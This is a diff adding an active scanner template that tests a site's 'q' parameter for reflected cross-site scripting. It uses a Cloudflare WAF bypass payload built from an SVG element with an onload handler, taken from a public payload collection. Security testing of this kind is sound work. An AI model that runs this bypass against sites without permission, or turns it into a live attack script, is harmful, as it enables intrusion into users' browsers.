@@ -1,0 +1,20 @@
+id: patt-xss-cf-01-q
+name: 'PATT xss patt-xss-cf-01 via q'
+severity: high
+type: active
+tags:
+  - xss
+  - patt
+  - wafcloudflare
+description: 'PATT Cloudflare 25 Jan 2021 (@bohdansec): attribute dummy onrandom. [patt:patt-xss-cf-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      q:
+        - '<svg/onrandom=random onload=nxp0024>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nxp0024'
